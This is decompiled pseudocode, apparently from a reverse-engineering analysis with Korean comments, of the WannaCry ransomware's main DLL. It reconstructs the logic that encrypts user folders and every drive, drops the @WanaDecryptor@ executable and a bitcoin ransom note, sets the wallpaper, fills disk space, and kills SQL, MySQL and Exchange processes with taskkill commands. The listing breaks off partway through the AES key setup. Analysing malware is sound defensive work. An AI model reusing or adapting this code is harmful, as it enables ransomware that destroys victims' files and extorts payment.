int __cdecl ScanUserDirs_10004A40(int csidl, int a2, int a3)
{
  const wchar_t *v3; // esi
  int result; // eax
  const wchar_t *v5; // ebx
  wchar_t *v6; // eax
  HANDLE hFindFile; // [esp+18h] [ebp-86Ch]
  WCHAR pszPath; // [esp+1Ch] [ebp-868h] BYREF
  wchar_t v9[259]; // [esp+1Eh] [ebp-866h] BYREF
  wchar_t Buffer; // [esp+224h] [ebp-660h] BYREF
  char v11[516]; // [esp+226h] [ebp-65Eh] BYREF
  __int16 v12; // [esp+42Ah] [ebp-45Ah]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+42Ch] [ebp-458h] BYREF
  WCHAR String; // [esp+67Ch] [ebp-208h] BYREF
  char v15[516]; // [esp+67Eh] [ebp-206h] BYREF
  __int16 v16; // [esp+882h] [ebp-2h]

  pszPath = word_1000D918;
  String = word_1000D918;
  memset(v9, 0, 0x204u);
  v9[258] = 0;
  memset(v15, 0, sizeof(v15));
  v16 = 0;
  v3 = 0;
  SHGetFolderPathW(0, csidl, 0, 0, &pszPath);   // Windows의 특수 폴더를 탐색하여 특정 하위 디렉터리 구조를 기반으로 콜백 함수를 호출  
  if ( wcslen(&pszPath) < 4 )
    return 0;
  result = (int)wcsrchr(&pszPath, 0x5Cu);       // 파일 암호화 루틴에서 특정 폴더 안에 있는 대상 위치를 수집하고 처리 
  if ( result )
  {
    *(_WORD *)result = 0;
    v5 = (const wchar_t *)(result + 2);
    result = (int)wcschr(&v9[2], 0x5Cu);
    if ( result )
    {
      *(_WORD *)result = 0;
      if ( csidl == 46 )
      {
        SHGetFolderPathW(0, 5, 0, 0, &String);
        if ( wcslen(&String) >= 4 )
        {
          v6 = wcsrchr(&String, 0x5Cu);
          v3 = v6;
          if ( v6 )
          {
            *v6 = 0;
            v3 = v6 + 1;
          }
        }
      }
      Buffer = word_1000D918;
      memset(v11, 0, sizeof(v11));
      v12 = 0;
      swprintf(&Buffer, (const size_t)L"%s\\*.*", &pszPath);
      hFindFile = FindFirstFileW(&Buffer, &FindFileData);
      if ( hFindFile == (HANDLE)-1 )
      {
        result = 0;
      }
      else
      {
        do
        {
          if ( wcscmp(FindFileData.cFileName, L".") )
          {
            if ( wcscmp(FindFileData.cFileName, L"..") )
            {
              if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
              {
                swprintf(&Buffer, (const size_t)L"%s\\%s\\%s", &pszPath, FindFileData.cFileName, v5);
                ((void (__stdcall *)(wchar_t *, WCHAR *, int))a2)(&Buffer, FindFileData.cFileName, a3);
                if ( v3 )
                {
                  if ( wcscmp(v5, v3) )
                  {
                    swprintf(&Buffer, (const size_t)L"%s\\%s\\%s", &pszPath, FindFileData.cFileName, v3);
                    ((void (__stdcall *)(wchar_t *, WCHAR *, int))a2)(&Buffer, FindFileData.cFileName, a3);
                  }
                }
              }
            }
          }
        }
        while ( FindNextFileW(hFindFile, &FindFileData) );
        FindClose(hFindFile);
        result = 1;
      }
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: EnsureWanaDecryptorAndShortcut_10004CD0
// Address: 0x10004CD0
// Signature: unknown_signature
// ---------------
DWORD EnsureWanaDecryptorAndShortcut_10004CD0()
{
  DWORD result; // eax
  char v1; // [esp+3h] [ebp-6CDh]
  CHAR Buffer; // [esp+4h] [ebp-6CCh] BYREF
  char v3[516]; // [esp+5h] [ebp-6CBh] BYREF
  __int16 v4; // [esp+209h] [ebp-4C7h]
  char v5; // [esp+20Bh] [ebp-4C5h]
  char Format[1220]; // [esp+20Ch] [ebp-4C4h] BYREF

  if ( GetFileAttributesW(L"@WanaDecryptor@.exe") == -1 )// "u.wnry" 파일을 @WanaDecryptor@.exe로 복사 
    CopyFileA("u.wnry", "@WanaDecryptor@.exe", 0);
  result = GetFileAttributesW(L"@WanaDecryptor@.exe.lnk");// VBScript는 현재 디렉터리에 @WanaDecryptor@.exe.lnk 바로가기를 생성 
  if ( result == -1 )
  {
    strcpy(
      Format,
      "@echo off\r\n"
      "echo SET ow = WScript.CreateObject(\"WScript.Shell\")> m.vbs\r\n"
      "echo SET om = ow.CreateShortcut(\"%s%s\")>> m.vbs\r\n"
      "echo om.TargetPath = \"%s%s\">> m.vbs\r\n"
      "echo om.Save>> m.vbs\r\n"
      "cscript.exe //nologo m.vbs\r\n"
      "del m.vbs\r\n");
    Buffer = byte_1000DD98;
    memset(v3, 0, sizeof(v3));
    v4 = 0;
    v5 = 0;
    GetCurrentDirectoryA(0x208u, &Buffer);
    if ( strlen(&Buffer) )
    {
      if ( *(&v1 + strlen(&Buffer)) != 92 )
        strcat(&Buffer, "\\");
    }
    sprintf(&Format[220], Format, &Buffer, "@WanaDecryptor@.exe.lnk", &Buffer, "@WanaDecryptor@.exe");
    result = (DWORD)CreateAndRunTempBatchFile_10001140(&Format[220]);
  }
  return result;
}


// --- Metadata ---
// Function Name: createReadMe_10004DF0
// Address: 0x10004DF0
// Signature: unknown_signature
// ---------------
FILE *createReadMe_10004DF0()
{
  FILE *result; // eax
  FILE *v1; // esi
  FILE *v2; // esi
  char v3[100]; // [esp+14h] [ebp-23ECh] BYREF
  char Buffer; // [esp+78h] [ebp-2388h] BYREF
  char v5[4092]; // [esp+79h] [ebp-2387h] BYREF
  __int16 v6; // [esp+1075h] [ebp-138Bh]
  char v7; // [esp+1077h] [ebp-1389h]
  char v8[5000]; // [esp+1078h] [ebp-1388h] BYREF

  result = (FILE *)GetFileAttributesW(L"@Please_Read_Me@.txt");// @Please_Read_Me@.txt를 생성 
  if ( result == (FILE *)-1 )
  {
    result = fopen("r.wnry", "rb");
    v1 = result;
    if ( result )
    {
      Buffer = 0;
      memset(v5, 0, sizeof(v5));
      v6 = 0;
      v7 = 0;
      fread(&Buffer, 1u, 0x1000u, result);
      fclose(v1);
      result = wfopen(L"@Please_Read_Me@.txt", L"wb");
      v2 = result;
      if ( result )
      {
        if ( dword_1000D9D4 )
          sprintf(v3, "%.1f BTC", flt_1000D9D0);
        else
          sprintf(v3, "$%d worth of bitcoin", (unsigned int)(__int64)flt_1000D9D0);
        sprintf(v8, &Buffer, v3, &unk_1000DA0A, "@WanaDecryptor@.exe");
        fwrite(v8, 1u, strlen(v8) + 1, v2);
        result = (FILE *)fclose(v2);
      }
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: SetupWallpaperAndDrop_10004F20
// Address: 0x10004F20
// Signature: unknown_signature
// ---------------
int __stdcall SetupWallpaperAndDrop_10004F20(wchar_t *Format, wchar_t *String2, int a3)
{
  DWORD pcbBuffer; // [esp+10h] [ebp-614h] BYREF
  wchar_t Buffer; // [esp+14h] [ebp-610h] BYREF
  char v6[516]; // [esp+16h] [ebp-60Eh] BYREF
  __int16 v7; // [esp+21Ah] [ebp-40Ah]
  WCHAR String1; // [esp+21Ch] [ebp-408h] BYREF
  char v9[508]; // [esp+21Eh] [ebp-406h] BYREF
  __int16 v10; // [esp+41Ah] [ebp-20Ah]
  WCHAR WideCharStr; // [esp+41Ch] [ebp-208h] BYREF
  char v12[516]; // [esp+41Eh] [ebp-206h] BYREF
  __int16 v13; // [esp+622h] [ebp-2h]

  Buffer = word_1000D918;
  memset(v6, 0, sizeof(v6));
  v7 = 0;
  WideCharStr = word_1000D918;
  memset(v12, 0, sizeof(v12));                  // 구성 요소 파일을 복사하고 배경화면을 설정하는 기능 
  v13 = 0;
  swprintf(&Buffer, (const size_t)L"%s\\%s", Format, L"@WanaDecryptor@.bmp");
  MultiByteToWideChar(0, 0, "b.wnry", -1, &WideCharStr, 259);
  if ( CopyFileW(&WideCharStr, &Buffer, 0) )
  {
    String1 = word_1000D918;
    memset(v9, 0, sizeof(v9));
    v10 = 0;
    pcbBuffer = 255;
    GetUserNameW(&String1, &pcbBuffer);
    if ( !wcsicmp(&String1, String2) )
      SystemParametersInfoW(0x14u, 0, &Buffer, 1u);
  }
  swprintf(&Buffer, (const size_t)L"%s\\%s", Format, L"@WanaDecryptor@.exe");
  CopyFileW(L"@WanaDecryptor@.exe", &Buffer, 0);
  return 1;
}


// --- Metadata ---
// Function Name: runAttribInRecyclePath_10005060
// Address: 0x10005060
// Signature: unknown_signature
// ---------------
LPWSTR __cdecl runAttribInRecyclePath_10005060(int driveIndex, LPWSTR outPathBuffer)
{
  char commandLineBuffer[1024]; // [esp+8h] [ebp-400h] BYREF

  GetWindowsDirectoryW(outPathBuffer, 0x104u);
  if ( *outPathBuffer == driveIndex + 65 )      // 특정 드라이브에 $RECYCLE 폴더를 만들고 숨김 
  {
    GetTempPathW(0x104u, outPathBuffer);
    if ( wcslen(outPathBuffer) && outPathBuffer[wcslen(outPathBuffer) - 1] == 92 )
    {
      outPathBuffer[wcslen(outPathBuffer) - 1] = 0;
      return outPathBuffer;
    }
  }
  else
  {
    swprintf(outPathBuffer, (const size_t)L"%C:\\%s", (const wchar_t *const)(driveIndex + 65), L"$RECYCLE");
    CreateDirectoryW(outPathBuffer, 0);
    sprintf(commandLineBuffer, "attrib +h +s %C:\\%s", driveIndex + 65, "$RECYCLE");// attrib 실행 
    RunProcessWithTimeout_10001080(commandLineBuffer, 0, 0);
  }
  return outPathBuffer;
}


// --- Metadata ---
// Function Name: deleteMarker_10005120
// Address: 0x10005120
// Signature: unknown_signature
// ---------------
wchar_t *__cdecl deleteMarker_10005120(int a1, wchar_t *Buffer)
{
  wchar_t Format; // [esp+8h] [ebp-208h] BYREF
  char v4[516]; // [esp+Ah] [ebp-206h] BYREF
  __int16 v5; // [esp+20Eh] [ebp-2h]

  Format = 0;
  memset(v4, 0, sizeof(v4));
  v5 = 0;
  runAttribInRecyclePath_10005060(a1, &Format);
  swprintf(Buffer, (const size_t)L"%s\\hibsys%s", &Format, L".WNCRYT");// 해당 확장자를 가진 파일을 지움 
  DeleteFileW(Buffer);
  return Buffer;
}


// --- Metadata ---
// Function Name: WriteMarkerAndFillDisk_10005190
// Address: 0x10005190
// Signature: unknown_signature
// ---------------
void *__cdecl WriteMarkerAndFillDisk_10005190(int a1)
{
  void *result; // eax
  void *v2; // ebx
  HANDLE v3; // edi
  int v4; // esi
  WCHAR RootPathName[2]; // [esp+Ch] [ebp-22Ch] BYREF
  int v6; // [esp+10h] [ebp-228h]
  ULARGE_INTEGER TotalNumberOfFreeBytes; // [esp+14h] [ebp-224h] BYREF
  DWORD NumberOfBytesWritten; // [esp+1Ch] [ebp-21Ch] BYREF
  ULARGE_INTEGER TotalNumberOfBytes; // [esp+20h] [ebp-218h] BYREF
  ULARGE_INTEGER FreeBytesAvailableToCaller; // [esp+28h] [ebp-210h] BYREF
  WCHAR FileName; // [esp+30h] [ebp-208h] BYREF
  char v12[516]; // [esp+32h] [ebp-206h] BYREF
  __int16 v13; // [esp+236h] [ebp-2h]

  RootPathName[1] = HIWORD(dword_1000D7A4);     // 키 임포트 여부에 따른 쓰기 반복 루틴으로 디스크 또는 시스템 상태를 변화
  v6 = dword_1000D7A8;
  RootPathName[0] = a1 + 65;                    // 드라이브 유형 확인 
  result = (void *)GetDriveTypeW(RootPathName);
  if ( result == (void *)3 )
  {
    result = GlobalAlloc(0, 0xA00000u);         // 메모리 할당 
    v2 = result;
    if ( result )
    {
      memset(result, 0x55u, 0xA00000u);
      FileName = 0;
      memset(v12, 0, sizeof(v12));
      v13 = 0;
      deleteMarker_10005120(a1, &FileName);
      v3 = CreateFileW(&FileName, 0x40000000u, 0, 0, 2u, 2u, 0);
      if ( v3 == (HANDLE)-1 )
      {
        result = GlobalFree(v2);
      }
      else
      {
        MoveFileExW(&FileName, 0, 4u);
        if ( !isImportKeySuccess_1000DD8C )
        {
LABEL_6:
          if ( GetDiskFreeSpaceExW(             // 디스크 여유 공간 검사 
                 RootPathName,
                 &FreeBytesAvailableToCaller,
                 &TotalNumberOfBytes,
                 &TotalNumberOfFreeBytes)
            && TotalNumberOfFreeBytes.QuadPart > 0x40000000 )
          {
            v4 = 0;
            while ( WriteFile(v3, v2, 0xA00000u, &NumberOfBytesWritten, 0) )
            {
              Sleep(0xAu);
              if ( (unsigned int)++v4 >= 0x14 )
              {
                Sleep(0x2710u);
                if ( !isImportKeySuccess_1000DD8C )
                  goto LABEL_6;
                break;
              }
            }
          }
        }
        GlobalFree(v2);
        FlushFileBuffers(v3);
        CloseHandle(v3);
        result = (void *)DeleteFileW(&FileName);
      }
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: RunTaskdl_10005300
// Address: 0x10005300
// Signature: unknown_signature
// ---------------
DWORD __stdcall RunTaskdl_10005300(LPVOID lpThreadParameter)
{
  if ( isImportKeySuccess_1000DD8C )            // 키를 성공적으로 가져왔으면 taskdl 실행 
    return 0;
  do
  {
    RunProcessWithTimeout_10001080("taskdl.exe", 0xFFFFFFFF, 0);
    Sleep(30000u);
  }
  while ( !isImportKeySuccess_1000DD8C );
  return 0;
}


// --- Metadata ---
// Function Name: LogMessageAndAccumulateSize_10005340
// Address: 0x10005340
// Signature: unknown_signature
// ---------------
int __stdcall LogMessageAndAccumulateSize_10005340(int a1, LPCWCH lpWideCharStr, int a3, int a4, int a5, int a6)
{
  FILE *v6; // esi
  CHAR MultiByteStr[620]; // [esp+4h] [ebp-26Ch] BYREF

  ++count_1000DCE4;                             // 호출 카운트 및 누적 값을 추적 
  sizeSum_1000DCE8 += __PAIR64__(a3, a4);
  if ( a6 )
  {
    v6 = fopen("f.wnry", "at");                 // WideChar 문자열 로그를 "f.wnry"라는 파일에 기록 
    if ( v6 )
    {
      WideCharToMultiByte(0, 0, lpWideCharStr, -1, MultiByteStr, 619, 0, 0);
      fprintf(v6, "%s\n", MultiByteStr);
      fclose(v6);
    }
  }
  return 1;
}


// --- Metadata ---
// Function Name: encryptIfTargetUser_100053F0
// Address: 0x100053F0
// Signature: unknown_signature
// ---------------
int __stdcall encryptIfTargetUser_100053F0(wchar_t *Format, wchar_t *String2, int a3)
{
  int result; // eax
  DWORD pcbBuffer; // [esp+4h] [ebp-204h] BYREF
  WCHAR Buffer; // [esp+8h] [ebp-200h] BYREF
  char v6[508]; // [esp+Ah] [ebp-1FEh] BYREF
  __int16 v7; // [esp+206h] [ebp-2h]

  Buffer = word_1000D918;
  memset(v6, 0, sizeof(v6));
  v7 = 0;
  pcbBuffer = 255;
  GetUserNameW(&Buffer, &pcbBuffer);            // 사용자 이름에 따라 암호화 수행 
  if ( wcsicmp(&Buffer, String2) )
    result = encryptAndCleanupFiles_100027F0((_DWORD *)a3, Format, 1);
  else
    result = 1;
  return result;
}


// --- Metadata ---
// Function Name: encryptUserDirectories_10005480
// Address: 0x10005480
// Signature: unknown_signature
// ---------------
int __cdecl encryptUserDirectories_10005480(_DWORD *a1)
{
  WCHAR pszPath; // [esp+Ch] [ebp-208h] BYREF
  char v3[516]; // [esp+Eh] [ebp-206h] BYREF
  __int16 v4; // [esp+212h] [ebp-2h]

  pszPath = word_1000D918;
  memset(v3, 0, sizeof(v3));
  v4 = 0;
  SHGetFolderPathW(0, 0, 0, 0, &pszPath);       // 복호화 타겟 디렉터리를 순차적으로 스캔하며 조건에 따라 파일 복호화
  if ( wcslen(&pszPath) )
    encryptAndCleanupFiles_100027F0(a1, &pszPath, 1);
  pszPath = 0;
  SHGetFolderPathW(0, 5, 0, 0, &pszPath);
  if ( wcslen(&pszPath) )
    encryptAndCleanupFiles_100027F0(a1, &pszPath, 1);
  ScanUserDirs_10004A40(25, (int)encryptIfTargetUser_100053F0, (int)a1);
  return ScanUserDirs_10004A40(46, (int)encryptIfTargetUser_100053F0, (int)a1);
}


// --- Metadata ---
// Function Name: CheckDriveAndEncryptFiles_10005540
// Address: 0x10005540
// Signature: unknown_signature
// ---------------
void __cdecl CheckDriveAndEncryptFiles_10005540(int mainObject, LONG Value, int a3)
{
  int v3; // esi
  UINT (__stdcall *v4)(LPCWSTR); // esi
  WCHAR DirectoryName[2]; // [esp+10h] [ebp-228h] BYREF
  int v6; // [esp+14h] [ebp-224h]
  ULARGE_INTEGER TotalNumberOfBytes; // [esp+18h] [ebp-220h] BYREF
  ULARGE_INTEGER TotalNumberOfFreeBytes; // [esp+20h] [ebp-218h] BYREF
  ULARGE_INTEGER FreeBytesAvailableToCaller; // [esp+28h] [ebp-210h] BYREF
  wchar_t Source; // [esp+30h] [ebp-208h] BYREF
  char v11[516]; // [esp+32h] [ebp-206h] BYREF
  __int16 v12; // [esp+236h] [ebp-2h]

  DirectoryName[1] = HIWORD(dword_1000D7A4);    // 드라이브 문자를 받아 해당 드라이브 상태를 확인 
  v6 = dword_1000D7A8;
  DirectoryName[0] = Value + 65;
  if ( a3 )                                     // 로컬 드라이브에 대해 암호화 및 정리 작업 
  {
    v4 = GetDriveTypeW;
    if ( GetDriveTypeW(DirectoryName) == 5 )
      return;
    InterlockedExchange(&Target, Value);
    goto LABEL_12;
  }
  if ( InterlockedExchangeAdd(&Target, 0) != Value )
  {
    v3 = 0;
    while ( !GetDiskFreeSpaceExW(
               DirectoryName,
               &FreeBytesAvailableToCaller,
               &TotalNumberOfBytes,
               &TotalNumberOfFreeBytes)
         || !TotalNumberOfBytes.QuadPart )
    {
      Sleep(0x3E8u);
      if ( ++v3 >= 30 )
        return;
    }
    v4 = GetDriveTypeW;
    if ( GetDriveTypeW(DirectoryName) != 5 )
    {
LABEL_12:
      if ( v4(DirectoryName) == 3 )
      {
        Source = 0;
        memset(v11, 0, sizeof(v11));
        v12 = 0;
        runAttribInRecyclePath_10005060(Value, &Source);
        generateEncryptFilePath_10001910((wchar_t *)mainObject, &Source);
      }
      LOWORD(v6) = 0;
      encryptAndCleanupFiles_100027F0((_DWORD *)mainObject, DirectoryName, 1);
      return;
    }
  }
}


// --- Metadata ---
// Function Name: encryptDrive_10005680
// Address: 0x10005680
// Signature: unknown_signature
// ---------------
DWORD __stdcall encryptDrive_10005680(LPVOID lpThreadParameter)
{
  _DWORD mainObject[585]; // [esp+0h] [ebp-930h] BYREF
  int v3; // [esp+92Ch] [ebp-4h]

  initMainObject_10001590(mainObject);
  v3 = 0;
  if ( initCryptoSession_10001830(              // 암호화 세션을 초기화하고, 지정된 드라이브에서 암호화를 시도하는 스레드 작업 
         mainObject,
         pky_1000DD24,
         (int)LogMessageAndAccumulateSize_10005340,
         (int)&isImportKeySuccess_1000DD8C) )
  {
    CheckDriveAndEncryptFiles_10005540((int)mainObject, (LONG)lpThreadParameter, 0);
    WriteMarkerAndFillDisk_10005190((int)lpThreadParameter);
    CleanupCryptoObject_10001760((int)mainObject);
    ExitThread(0);
  }
  v3 = -1;
  CryptoObject_Destructor_10001680((char *)mainObject);
  return 0;
}


// --- Metadata ---
// Function Name: DriveDetectionEncryption_10005730
// Address: 0x10005730
// Signature: unknown_signature
// ---------------
void __stdcall __noreturn DriveDetectionEncryption_10005730(LPVOID lpThreadParameter)
{
  DWORD v1; // ebp
  DWORD v2; // edi
  int v3; // esi
  HANDLE v4; // eax

  v1 = GetLogicalDrives();                      // 시스템의 논리 드라이브 변화를 감시하면서, 새로운 드라이브가 추가되면 해당 드라이브에 대해 암호화 스레드를 생성 
  if ( !isImportKeySuccess_1000DD8C )
  {
    while ( 1 )
    {
      Sleep(0xBB8u);
      v2 = v1;
      v1 = GetLogicalDrives();
      if ( v1 != v2 )
        break;
LABEL_10:
      if ( isImportKeySuccess_1000DD8C )
        goto LABEL_11;
    }
    v3 = 3;
    while ( !isImportKeySuccess_1000DD8C )
    {
      if ( (((v1 ^ v2) >> v3) & 1) != 0 && ((v2 >> v3) & 1) == 0 )
      {
        v4 = CreateThread(0, 0, encryptDrive_10005680, (LPVOID)v3, 0, 0);
        if ( v4 )
          CloseHandle(v4);
      }
      if ( ++v3 >= 26 )
        goto LABEL_10;
    }
  }
LABEL_11:
  ExitThread(0);
}


// --- Metadata ---
// Function Name: WannaCryMainRoutine_100057C0
// Address: 0x100057C0
// Signature: unknown_signature
// ---------------
void WannaCryMainRoutine_100057C0()
{
  int v0; // esi
  DWORD v1; // ebx
  int i; // edi
  LONG j; // esi
  BOOL v4; // esi
  int k; // esi
  int v6; // [esp+4h] [ebp-D44h]
  WCHAR RootPathName[2]; // [esp+8h] [ebp-D40h] BYREF
  int v8; // [esp+Ch] [ebp-D3Ch]
  WCHAR v9[2]; // [esp+10h] [ebp-D38h] BYREF
  int v10; // [esp+14h] [ebp-D34h]
  char Buffer[1024]; // [esp+18h] [ebp-D30h] BYREF
  _DWORD Parameter[585]; // [esp+418h] [ebp-930h] BYREF
  int v13; // [esp+D44h] [ebp-4h]

  initMainObject_10001590(Parameter);
  v0 = 0;
  v13 = 0;
  if ( !initCryptoSession_10001830(             // 설정 및 초기화 
          Parameter,
          pky_1000DD24,
          (int)LogMessageAndAccumulateSize_10005340,
          (int)&isImportKeySuccess_1000DD8C) )
    goto LABEL_35;
  if ( GetFileAttributesA("f.wnry") == -1 )
    storeTwoValues_100018F0(Parameter, 10, 100);
  if ( !dword_1000DCC8 )
  {
    dword_1000DCC8 = time(0);
    writeCryptrandomToRes_10004730();
    sprintf(Buffer, "%s fi", "@WanaDecryptor@.exe");// 랜섬UI 실행 
    RunProcessWithTimeout_10001080(Buffer, 0x186A0u, 0);
    CwnryIO_10001000(&unk_1000D958, 1);
  }
  EnsureWanaDecryptorAndShortcut_10004CD0();    // 암호화 루틴 실행 
  createReadMe_10004DF0();
  encryptUserDirectories_10005480(Parameter);
  if ( isImportKeySuccess_1000DD8C )
    goto LABEL_35;
  while ( 2 )
  {
    InterlockedExchange(&Target, -1);
    v6 = v0 + 1;
    if ( v0 == 1 )
    {
      RunProcessWithTimeout_10001080("taskkill.exe /f /im Microsoft.Exchange.*", 0, 0);// 백그라운드 서비스 종료 
      RunProcessWithTimeout_10001080("taskkill.exe /f /im MSExchange*", 0, 0);
      RunProcessWithTimeout_10001080("taskkill.exe /f /im sqlserver.exe", 0, 0);
      RunProcessWithTimeout_10001080("taskkill.exe /f /im sqlwriter.exe", 0, 0);
      RunProcessWithTimeout_10001080("taskkill.exe /f /im mysqld.exe", 0, 0);
    }
    v1 = GetLogicalDrives();
    for ( i = 0; i < 2; ++i )
    {
      for ( j = 25; j >= 2; --j )
      {
        RootPathName[1] = HIWORD(dword_1000D7A4);
        RootPathName[0] = j + 65;
        v8 = dword_1000D7A8;
        if ( isImportKeySuccess_1000DD8C )
          break;
        if ( ((v1 >> j) & 1) != 0 )
        {
          if ( i )
          {
            if ( i == 1 && GetDriveTypeW(RootPathName) != 4 )
              continue;
LABEL_20:
            CheckDriveAndEncryptFiles_10005540((int)Parameter, j, 1);
            continue;
          }
          if ( GetDriveTypeW(RootPathName) != 4 )
            goto LABEL_20;
        }
      }
    }
    InterlockedExchange(&Target, -1);
    ScanUserDirs_10004A40(25, (int)SetupWallpaperAndDrop_10004F20, 0);
    v4 = dword_1000DCE0 == 0;
    if ( !dword_1000DCE0 )
    {
      sprintf(Buffer, "%s co", "@WanaDecryptor@.exe");
      RunProcessWithTimeout_10001080(Buffer, 0, 0);
    }
    dword_1000DCE0 = time(0);
    writeCryptrandomToRes_10004730();
    if ( v6 == 1 )
    {
      sprintf(Buffer, "cmd.exe /c start /b %s vs", "@WanaDecryptor@.exe");
      RunProcessWithTimeout_10001080(Buffer, 0, 0);
    }
    if ( v4 )
    {
      WriteMarkerAndFillDisk_10005190(2);
      for ( k = 25; k > 2; --k )
      {
        if ( isImportKeySuccess_1000DD8C )
          break;
        if ( ((v1 >> k) & 1) != 0 )
        {
          v9[1] = HIWORD(dword_1000D7A4);
          v10 = dword_1000D7A8;
          v9[0] = k + 65;
          if ( GetDriveTypeW(v9) == 3 )
            WriteMarkerAndFillDisk_10005190(k);
        }
      }
    }
    Sleep(0xEA60u);
    if ( !isImportKeySuccess_1000DD8C )
    {
      v0 = v6;
      continue;
    }
    break;
  }
LABEL_35:
  v13 = -1;
  CryptoObject_Destructor_10001680((char *)Parameter);
}


// --- Metadata ---
// Function Name: TaskStart
// Address: 0x10005AE0
// Signature: unknown_signature
// ---------------
int __stdcall TaskStart(HMODULE hModule, int a2)
{
  char *v2; // eax
  char *v3; // esi
  HANDLE v4; // eax
  HANDLE v5; // eax
  HANDLE v6; // ebx
  HANDLE v7; // eax
  HANDLE v8; // eax
  HANDLE v10; // esi
  WCHAR Filename; // [esp+10h] [ebp-214h] BYREF
  char v12[516]; // [esp+12h] [ebp-212h] BYREF
  __int16 v13; // [esp+216h] [ebp-Eh]
  int v14; // [esp+220h] [ebp-4h]

  if ( a2 || createMutex_10004690() )
    return 0;
  Filename = word_1000D918;
  memset(v12, 0, sizeof(v12));
  v13 = 0;
  GetModuleFileNameW(hModule, &Filename, 0x103u);
  if ( wcsrchr(&Filename, 0x5Cu) )
    *wcsrchr(&Filename, 0x5Cu) = 0;
  SetCurrentDirectoryW(&Filename);
  if ( !CwnryIO_10001000(&unk_1000D958, 1) )
    return 0;
  dword_1000DD94 = IsRunningAsSystem_100012D0();
  if ( !LoadFileIOAPI_10003410() )
    return 0;
  sprintf(resFile, "%08X.res", 0);
  sprintf(pky_1000DD24, "%08X.pky", 0);
  sprintf(eky_1000DD58, "%08X.eky", 0);
  if ( createMutexAndGrantToEveryone_10004600(0) || importKeyAndVerify_10004500(0) )
  {
    v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)autostartWanaDecryptor_10004990, 0, 0, 0);
    WaitForSingleObject(v10, 0xFFFFFFFF);
    CloseHandle(v10);
    return 0;
  }
  v2 = (char *)operator new(0x28u);
  v14 = 0;
  if ( v2 )
    v3 = initObject_10003A10(v2);
  else
    v3 = 0;
  v14 = -1;
  if ( !v3 || !SetupCryptoSessionKey_10003AC0(v3, pky_1000DD24, eky_1000DD58) )
    return 0;
  if ( !Read136bytes_100046D0() || dword_1000DC70 )
  {
    DeleteFileA(resFile);
    memset(&cryptRandom, 0, 0x88u);
    dword_1000DC70 = 0;
    CryptGenRandomWrapper_10004420((HCRYPTPROV *)v3, &cryptRandom, 8u);
  }
  ReleaseCryptoResources_10003BB0(v3);
  (**(void (__thiscall ***)(char *, int))v3)(v3, 1);
  v4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)writeCryptToResPeriodically_10004790, 0, 0, 0);
  if ( v4 )
    CloseHandle(v4);
  Sleep(0x64u);
  v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WaitForKeyImportAndVerify_100045C0, 0, 0, 0);
  if ( v5 )
    CloseHandle(v5);
  Sleep(0x64u);
  v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DriveDetectionEncryption_10005730, 0, 0, 0);
  Sleep(0x64u);
  v7 = CreateThread(0, 0, RunTaskdl_10005300, 0, 0, 0);
  if ( v7 )
    CloseHandle(v7);
  Sleep(0x64u);
  v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)autostartWanaDecryptor_10004990, 0, 0, 0);
  if ( v8 )
    CloseHandle(v8);
  Sleep(0x64u);
  WannaCryMainRoutine_100057C0();
  if ( v6 )
  {
    WaitForSingleObject(v6, 0xFFFFFFFF);
    CloseHandle(v6);
  }
  return 0;
}


// --- Metadata ---
// Function Name: initVTableFuncPtr_10005D80
// Address: 0x10005D80
// Signature: unknown_signature
// ---------------
_BYTE *__thiscall initVTableFuncPtr_10005D80(_BYTE *byteFieldObject)
{
  _BYTE *initializedObj; // eax

  initializedObj = byteFieldObject;             // 가상 함수 테이블 포인터를 설정 
  byteFieldObject[4] = 0;
  *(_DWORD *)byteFieldObject = &off_1000ACBC;
  return initializedObj;
}


// --- Metadata ---
// Function Name: sub_10005D90
// Address: 0x10005D90
// Signature: unknown_signature
// ---------------
void *__thiscall sub_10005D90(void *this, char a2)
{
  DestroyCryptoObject_10005DB0(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}


// --- Metadata ---
// Function Name: DestroyCryptoObject_10005DB0
// Address: 0x10005DB0
// Signature: unknown_signature
// ---------------
void __thiscall DestroyCryptoObject_10005DB0(_DWORD *this)
{
  *this = &off_1000ACBC;                        // 가상 테이블 초기화 
}


// --- Metadata ---
// Function Name: InitializeAESContext_10005DC0
// Address: 0x10005DC0
// Signature: unknown_signature
// ---------------
int __thiscall InitializeAESContext_10005DC0(int this, int IVPtr, int keyPtr, int keyLen, int IVLen)
{
  int v6; // ecx
  const void *v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // edx
  int v12; // eax
  int wordsPerKey; // ecx
  char *v14; // esi
  int v15; // edx
  char *v16; // esi
  int v17; // esi
  __int64 v18; // rax
  int v19; // edi
  int v20; // ebp
  unsigned __int8 *v21; // eax
  int v22; // ebp
  _BYTE *v23; // eax
  unsigned __int16 v24; // dx
  int v25; // esi
  int v26; // eax
  int v27; // edx
  int v28; // eax
  int v29; // ecx
  _DWORD *v30; // eax
  int v31; // ecx
  _DWORD *v32; // eax
  int v33; // ecx
  int v34; // ecx
  _DWORD *v35; // eax
  int *v36; // edi
  int v37; // ebp
  int v38; // ecx
  int v39; // edx
  int v40; // eax
  bool v41; // cc
  int v42; // edx
  int result; // eax
  int v44; // ebp
  int *v45; // esi
  int v46; // edi
  int v47; // edx
  int v48; // [esp+4h] [ebp-10h]
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !IVPtr )                                 // AES 암호화의 키 확장과 상태 초기화 루틴 
  {
    IVPtr = (int)&unk_1000D8D8;
    exception::exception((exception *)pExceptionObject, (const char *const *)&IVPtr);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
  }
  if ( keyLen != 16 && keyLen != 24 && keyLen != 32 )
  {
    IVPtr = (int)&unk_1000D8D8;
    exception::exception((exception *)pExceptionObject, (const char *const *)&IVPtr);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVexception__);
  }
  v6 = IVLen;
